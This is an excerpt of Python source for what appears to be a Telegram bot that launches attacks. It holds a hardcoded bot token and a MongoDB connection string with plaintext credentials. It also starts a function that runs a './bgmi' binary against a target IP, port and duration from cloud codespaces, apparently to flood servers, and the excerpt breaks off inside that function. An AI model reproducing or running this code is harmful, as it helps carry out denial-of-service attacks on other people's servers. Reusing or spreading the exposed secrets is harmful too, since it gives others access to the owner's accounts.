...
TOKEN = '8056007192:AAH4zHYf5Lgx-_OW7HzrfuE5ZBuhzdH0h3M'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002269369345
CHANNEL_ID = -1002269369345
error_channel_id = -1002269369345
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./bgmi {target_ip} {target_port} {duration} 350"
    try:
